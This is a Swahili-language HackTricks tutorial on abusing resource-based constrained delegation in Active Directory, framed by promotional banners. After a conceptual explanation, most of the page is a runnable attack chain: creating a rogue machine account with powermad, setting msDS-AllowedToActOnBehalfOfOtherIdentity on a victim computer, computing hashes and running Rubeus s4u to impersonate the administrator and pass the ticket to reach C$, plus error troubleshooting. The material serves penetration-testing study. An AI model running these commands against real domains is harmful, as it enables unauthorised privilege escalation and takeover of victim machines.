# Kudhibiti Uteuzi Kulingana na Rasilimali

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Misingi ya Kudhibiti Uteuzi Kulingana na Rasilimali

Hii inafanana na [Uteuzi Uliodhibitiwa](constrained-delegation.md) lakini **badala** ya kutoa ruhusa kwa **kitu** kuwa **kijifanya kuwa mtumiaji yeyote dhidi ya huduma**. Uteuzi Uliodhibitiwa Kulingana na Rasilimali **huanzisha** kwenye **kitu ni nani anayeweza kujifanya kuwa mtumiaji yeyote dhidi yake**.

Katika kesi hii, kitu kilichodhibitiwa kitakuwa na sifa inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ na jina la mtumiaji ambaye anaweza kujifanya kuwa mtumiaji mwingine yeyote dhidi yake.

Tofauti muhimu nyingine kati ya Uteuzi Uliodhibitiwa huu na uteuzi mwingine ni kwamba mtumiaji yeyote mwenye **ruhusa za kuandika juu ya akaunti ya mashine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/n.k_) anaweza kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Katika aina zingine za Uteuzi ulihitaji mamlaka ya msimamizi wa kikoa).

### Dhana Mpya

Kurudi kwa Uteuzi Uliodhibitiwa kulieleza kuwa bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika kufanya **S4U2Self.** Lakini hiyo sio ukweli kamili.\
Ukweli ni kwamba hata bila thamani hiyo, unaweza kufanya **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **huduma** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS itarudi itakuwa **inayoweza kusonga mbele** na ikiwa **huna** bendera hiyo TGS itarudi **haitaweza** kusonga mbele.

Hata hivyo, ikiwa **TGS** inayotumiwa katika **S4U2Proxy** **HAITAWEZI kusonga mbele** jaribio la kutumia **Uteuzi Uliodhibitiwa wa Msingi wa Rasilimali** **halitafanya kazi**. Lakini ikiwa unajaribu kudukua **Uteuzi Uliodhibitiwa Kulingana na Rasilimali, itafanya kazi** (hii sio udhaifu, ni kipengele, kwa mujibu wa ripoti).

### Muundo wa Shambulio

> Ikiwa una **ruhusa sawa za kuandika** juu ya akaunti ya **Kompyuta** unaweza kupata **upatikanaji wa haki** kwenye kompyuta hiyo.

Fikiria kuwa mkaidi tayari ana **ruhusa sawa za kuandika juu ya kompyuta ya mwathiriwa**.

1. Mkaidi **anashambulia** akaunti ambayo ina **SPN** au **inaunda moja** (“Huduma A”). Kumbuka kwamba **mtumiaji yeyote** wa _Msimamizi_ bila ruhusa maalum nyingine yoyote anaweza **kuunda** hadi 10 **vitu vya Kompyuta (**_**MachineAccountQuota**_**)** na kuweka SPN. Kwa hivyo mkaidi anaweza tu kuunda kitu cha Kompyuta na kuweka SPN.
2. Mkaidi **anatumia ruhusa yake YA KUANDIKA** juu ya kompyuta ya mwathiriwa (HudumaB) kusanidi **uteuzi uliodhibitiwa kulingana na rasilimali kuruhusu HudumaA kujifanya kuwa mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathiriwa (HudumaB).
3. Mkaidi anatumia Rubeus kufanya shambulio la **kamili la S4U** (S4U2Self na S4U2Proxy) kutoka Huduma A kwenda Huduma B kwa mtumiaji **mwenye upatikanaji wa haki kwenye Huduma B**.
1. S4U2Self (kutoka akaunti iliyodukuliwa/iliyoundwa na SPN): Uliza **TGS ya Msimamizi kwangu** (Isiyoweza kusonga mbele).
2. S4U2Proxy: Tumia **TGS isiyoweza kusonga mbele** ya hatua iliyotangulia kuomba **TGS** kutoka kwa **Msimamizi** kwenda kwa **mwenyeji wa mwathiriwa**.
3. Hata ikiwa unatumia TGS isiyoweza kusonga mbele, kwa kuwa unatumia uteuzi uliodhibitiwa kulingana na rasilimali, itafanya kazi.
4. Mkaidi anaweza **kupitisha-tiketi** na **kujifanya** kuwa mtumiaji kupata **upatikanaji wa HudumaB**.

Ili kuangalia _**MachineAccountQuota**_ ya kikoa unaweza kutumia:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulizi

### Kuunda Kielelezo cha Kompyuta

Unaweza kuunda kielelezo cha kompyuta ndani ya kikoa kwa kutumia [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kuweka Rasilimali Inayotegemea Uteuzi wa Kikomo

**Kutumia moduli ya PowerShell ya activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kutekeleza shambulio kamili la S4U

Kwanza kabisa, tuliumba kitu kipya cha Kompyuta na nenosiri `123456`, hivyo tunahitaji hash ya nenosiri hilo:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itachapisha RC4 na AES hashes kwa akaunti hiyo.\
Sasa, shambulio linaweza kutekelezwa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuzalisha tiketi zaidi kwa kuuliza mara moja kwa kutumia paramu ya `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Tafadhali kumbuka kuwa watumiaji wana sifa inayoitwa "**Haiwezi kupelekwa**". Ikiwa mtumiaji ana sifa hii kuwa Kweli, hutaweza kujifanya kuwa yeye. Mali hii inaweza kuonekana ndani ya bloodhound.
{% endhint %}

### Kupata

Amri ya mwisho itatekeleza **shambulio kamili la S4U na kuingiza TGS** kutoka kwa Msimamizi kwenda kwa mwenyeji wa mwathiriwa kwenye **kumbukumbu**.\
Katika mfano huu, ilikuwa imeombwa TGS kwa huduma ya **CIFS** kutoka kwa Msimamizi, hivyo utaweza kupata **C$**:
```bash
ls \\victim.domain.local\C$
```
### Matumizi ya tiketi za huduma tofauti

Jifunze kuhusu [**tiketi za huduma zilizopo hapa**](silver-ticket.md#available-services).

## Makosa ya Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa kerberos imeboreshwa kutokutumia DES au RC4 na unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa tu hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa wakati wa kompyuta ya sasa ni tofauti na ile ya DC na kerberos haifanyi kazi vizuri.
* **`preauth_failed`**: Hii inamaanisha kuwa jina la mtumiaji lililotolewa + hash hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji unapozalisha hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
  * Mtumiaji unayejaribu kujifanya hawezi kupata huduma inayotakiwa (kwa sababu huwezi kujifanya au kwa sababu haina vya kutosha)
  * Huduma uliyoomba haipo (ikiwa unauliza tiketi kwa winrm lakini winrm haifanyi kazi)
  * Kompyuta bandia iliyoanzishwa imepoteza mamlaka yake juu ya seva yenye mapungufu na unahitaji kuzirudisha.

## Marejeo

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
